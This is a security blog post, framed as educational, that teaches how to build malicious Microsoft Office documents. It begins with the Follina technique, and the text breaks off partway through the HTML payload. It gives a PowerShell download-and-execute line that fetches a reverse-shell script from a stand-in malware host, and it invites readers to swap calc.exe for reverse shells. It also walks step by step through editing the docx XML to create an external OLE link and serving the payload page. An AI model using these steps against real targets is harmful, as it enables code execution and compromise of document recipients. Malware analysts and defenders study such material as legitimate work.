---
title: Building Offensive Malicious Documents
url: https://fareedfauzi.github.io/2022/11/20/Offensive-maldocs.html
source: Over Security
date: 2026-11-02
fetch_date: 2026-11-03T08:51:34.242398
---

# Building Offensive Malicious Documents

xml version="1.0" standalone="no"?

[root@fareed:~#](/ "Personal blog for research, education and note purpose.
")

* [Cheatsheets](/cheatsheets.html)
* [Archive](/archive.html)
* [About](/about.html)

# Building Offensive Malicious Documents

* [Malicious-Document](/archive.html?tag=Malicious-Document)
* [Malware](/archive.html?tag=Malware)

* Nov 20, 2022

Generally, the attacker will use the below techniques in leveraging Microsoft Office features and vulnerabilities:

1. Exploits
2. Macros
3. Remote template injection and many more…

In this post, we will learn various techniques on how to make malicious documents that can execute our malicious code. Of course, to make it simple we will just run the calc/notepad application to show our proof of concept is proven.

Why do security researchers always pop up a calc.exe when doing a Proof-of-Concept? Because it is simple and easy to pop up a calculator, rather than creating Powershell one-liner or shellcoding just to show your POC is proven. Hehe

You can always replace the calc.exe execution with any payload you want like Powershell reverse shell or mshta fileless or anything else that is suitable your appetite but popping up a calc.exe indicated that we can also execute anything we wanted like download and execute malware. Not just a calc.exe execution.

For example, malicious Powershell like below:

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://malware.com/mini-reverse.ps1')
```

This is for education only whereby the purpose of this blog to understand how malicious documents were created by the attacker out there. Do with your own risk.

# Follina

We started with the latest and famous malicious document called Follina. Researchers have reproduced the zero-day with multiple versions of Microsoft Office and even publish their Follina malicious document generator on GitHub.

Here are the steps to build the docx:

Open Microsoft Word, create a dummy document. Insert an (OLE) object (as a Bitmap Image), save it in docx:
![image](https://user-images.githubusercontent.com/56353946/203402911-da9c543b-ffd6-4d3b-bf08-1ad2734b1158.png)

Unzip the docx file and edit `word/_rels/document.xml.rels` in the docx structure. Modify the XML tag `<Relationship` with attribute
`Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject` and `Target="embeddings/oleObject1.bin"` by changing the Target value and adding attribute `TargetMode` like below:

```
Target = "http://malware.domain/payload.html!" TargetMode = "External"
```

![image](https://user-images.githubusercontent.com/56353946/203403755-38afb536-d0b9-458f-b910-487de70ecc14.png)

Note the Id value (probably it is “rIdX” where X is random number. For example 10).

Edit `word/document.xml`. Search for the `<o:OLEObject` tag (with r:id=”rd10”) and change the attribute from `Type="Embed"` to `Type="Link"` and add the attribute `UpdateMode="OnCall"`.

![image](https://user-images.githubusercontent.com/56353946/203404734-5c0708d6-12fb-466e-b14e-6391eb092f72.png)

Serve the payload in html payload with the ms-msdt scheme at hxxp://malware[.]com/payload.html:

```
<!doctype html>
<html lang="en">
<head>
<title>
Good thing we disabled macros
</title>
</head>
<body>
<p>
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque pellentesque egestas nulla in dignissim. Nam id mauris lorem. Nunc suscipit id magna id mollis. Pellentesque suscipit orci neque, at ornare sapien bibendum eu. Vestibulum malesuada nec sem quis finibus. Nam quis ligula et dui faucibus faucibus. In quis bibendum tortor.

Curabitur rutrum leo tortor, venenatis fermentum ex porttitor vitae. Proin eu imperdiet lorem, ac aliquet risus. Aenean eu sapien pharetra, imperdiet ipsum ut, semper diam. Nulla facilisi. Sed euismod tortor tortor, non eleifend nunc fermentum sit amet. Integer ligula ligula, congue at scelerisque sit amet, porttitor quis felis. Maecenas nec justo varius, semper turpis ut, gravida lorem. Proin arcu ligula, venenatis aliquam tristique ut, pretium quis velit.

Phasellus tristique orci enim, at accumsan velit interdum et. Aenean nec tristique ante, dignissim convallis ligula. Aenean quis felis dolor. In quis lectus massa. Pellentesque quis pretium massa. Vivamus facilisis ultricies massa ac commodo. Nam nec congue magna. Nullam laoreet justo ut vehicula lobortis.

Aliquam rutrum orci tortor, non porta odio feugiat eu. Vivamus nulla mauris, eleifend eu egestas scelerisque, vulputate id est. Proin rutrum nec metus convallis ornare. Ut ultricies ante et dictum imperdiet. Ut nisl magna, porttitor nec odio non, dapibus maximus nibh. Integer lorem felis, accumsan a dapibus hendrerit, maximus nec leo. Vestibulum porta, orci sed dignissim porta, sem justo porta odio, quis rutrum tortor arcu quis massa. Aenean eleifend nisi a quam faucibus, quis scelerisque lectus condimentum. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin non dui nec odio finibus molestie. Suspendisse id massa nunc. Sed ultricies et sapien vel fringilla.
</p>
<p>
Donec tincidunt ac justo et iaculis. Pellentesque lacinia, neque at consectetur porttitor, leo eros bibendum lorem, eu sollicitudin dolor urna pharetra augue. Pellentesque facilisis orci quis ante tempor, ac varius eros blandit. Nulla vulputate, purus eu consectetur ullamcorper, mauris nulla commodo dolor, in maximus purus mi eget purus. In mauris diam, imperdiet ac dignissim ut, mollis in purus. In congue volutpat tortor eu auctor. Nullam a eros lectus. Aenean porta semper quam ac lacinia. Curabitur interdum, nisl eu laoreet tempus, augue nisl volutpat odio, dictum aliquam massa orci sit amet magna.

Duis pulvinar vitae neque non placerat. Nullam at dui diam. In hac habitasse platea dictumst. Sed quis mattis libero. Nullam sit amet condimentum est. Nulla eget blandit elit. Nunc facilisis erat nec ligula ultrices, malesuada mollis ex porta. Phasellus iaculis lorem eu augue tincidunt, in ultrices massa suscipit. Donec gravida sapien ac dui interdum cursus. In finibus eu dolor sit amet porta. Sed ultrices nisl dui, at lacinia lectus porttitor ut.

Ut ac viverra risus. Suspendisse lacus nunc, porttitor facilisis mauris ut, ullamcorper gravida dolor. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus sollicitudin, arcu id sagittis facilisis, turpis dolor eleifend massa, in maximus sapien dui et tortor. Quisque varius enim sed enim venenatis tempor. Praesent quis volutpat lorem. Pellentesque ac venenatis lacus, vitae commodo odio. Sed in metus at libero viverra mollis sed vitae nibh. Sed at semper lectus.
</p>
<p>
Proin a interdum justo. Duis sed dui vitae ex molestie egestas et tincidunt neque. Fusce lectus tellus, pharetra id ex at, consectetur hendrerit nibh. Nulla sit amet commodo risus. Nulla sed dapibus ante, sit amet fringilla dui. Nunc lectus mauris, porttitor quis eleifend nec, suscipit sit amet massa. Vivamus in lectus erat. Nulla facilisi. Vivamus sed massa quis arcu egestas vehicula. Nulla massa lorem, tincidunt sed feugiat quis, faucibus a risus. Sed viverra turpis sit amet metus iaculis finibus.

Morbi convallis fringilla tortor, at consequat purus vulputate sit amet. Morbi a ultricies risus, id maximus purus. Fusce aliquet tortor id ante ornare, non auctor tortor luctus. Quisque laoreet, sem id porttitor eleifend, eros eros suscipit lectus, id facilisis lorem lorem nec nibh. Nullam venenatis ornare ornare. Donec varius ex ac faucibus condimentum. Aenean ultricies vitae mauris cursus ornare. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas aliquet felis vel nulla auctor, ac tempor mi mattis. Nam accumsan nisi vulputate, vestibulum nisl at, gravida erat. Nam diam metus, tempor id sapien eu, porta luctus felis. Aliquam luctus vitae tortor quis consectetur. In rutrum neque sit amet fermentum rutrum. Sed a velit at metus pretium tincidunt tristique eget nibh. In ultricies, est ut varius pulvinar, magna purus tristique arcu, et laoreet purus elit ac lectu...